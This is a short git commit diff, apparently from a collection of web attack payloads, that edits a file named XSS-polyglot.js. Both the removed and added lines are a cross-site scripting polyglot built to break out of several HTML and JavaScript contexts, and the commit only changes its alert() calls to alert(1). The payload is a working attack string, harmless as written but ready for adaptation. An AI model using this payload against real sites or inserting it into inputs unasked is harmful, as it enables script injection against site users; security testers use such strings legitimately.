f5795476bb34148b0e1f0b7757ea6b600c0800c4
BedwyrEmrys <bedwyr.emrys@outlook.com>
2019-04-30 15:39:59 +0800

    Update XSS-polyglot.js
    alert(1)

--- XSS-polyglot.js
+++ XSS-polyglot.js
@@ -1,1 +1,1 @@
-jaVasCript:/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+jaVasCript:alert(1)/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk=alert(1) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert(1)//>\x3e
